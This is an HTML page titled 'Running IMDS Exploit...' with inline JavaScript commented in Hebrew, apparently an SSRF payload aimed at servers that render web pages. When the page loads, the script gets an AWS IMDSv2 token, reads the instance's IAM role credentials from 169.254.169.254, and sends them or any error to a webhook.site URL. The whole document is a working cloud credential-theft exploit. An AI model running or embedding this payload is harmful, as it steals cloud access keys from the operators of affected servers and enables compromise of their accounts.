<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Running IMDS Exploit...</title>
</head>
<body>
  <h1>Running IMDS Exploit...</h1>
  <script>
    // תחילה מבקשים token מ־IMDSv2
    fetch("http://169.254.169.254/latest/api/token", {
      method: "PUT",
      headers: {
        "X-aws-ec2-metadata-token-ttl-seconds": "21600"
      }
    })
    .then(response => response.text())
    .then(token => {
      // עכשיו ניגשים ל־/latest/meta-data/ עם הטוקן
      return fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/", {
        method: "GET",
        headers: {
          "X-aws-ec2-metadata-token": token
        }
      });
    })
    .then(response => response.text())
    .then(roleName => {
      // עכשיו ניגש לפרטי ה־credentials עצמם
      return fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + roleName)
        .then(r => r.text());
    })
    .then(credentials => {
      // שולחים את כל המידע ל־webhook שלך
      new Image().src = "https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?imds=" + encodeURIComponent(credentials);
    })
    .catch(err => {
      // אם משהו נכשל, שלח שגיאה
      new Image().src = "https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?error=" + encodeURIComponent(err.message);
    });
  </script>
</body>
</html>
